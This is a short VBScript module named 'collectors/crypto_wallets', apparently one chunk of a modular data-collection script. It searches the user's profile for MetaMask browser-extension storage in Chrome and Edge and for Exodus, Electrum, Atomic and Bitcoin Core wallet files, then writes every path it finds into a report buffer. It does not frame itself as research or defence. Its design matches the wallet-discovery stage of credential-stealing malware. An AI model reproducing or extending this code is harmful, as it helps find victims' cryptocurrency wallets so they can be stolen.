' chunk: collectors/crypto_wallets
' depends: core/emit_buffer, core/file_ops
' provides: collect_crypto_wallets
' format: vbscript

Sub collect_crypto_wallets()
    emit vbCrLf & "=== CRYPTO WALLETS ===" & vbCrLf
    Dim localApp, appData
    localApp = _sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    appData = _sh.ExpandEnvironmentStrings("%APPDATA%")

    Dim walletNames, walletPaths, i
    walletNames = Array( _
        "MetaMask (Chrome)", "MetaMask (Edge)", _
        "Exodus", "Electrum", "Atomic", "Bitcoin Core" _
    )
    walletPaths = Array( _
        localApp & "\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn", _
        localApp & "\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeeeajnimhm", _
        appData & "\Exodus\exodus.wallet", _
        appData & "\Electrum\wallets", _
        appData & "\atomic\Local Storage", _
        appData & "\Bitcoin\wallet.dat" _
    )

    For i = 0 To UBound(walletNames)
        If _fso.FolderExists(walletPaths(i)) Or file_exists(walletPaths(i)) Then
            emit "  " & walletNames(i) & ": FOUND at " & walletPaths(i) & vbCrLf
        End If
    Next
End Sub
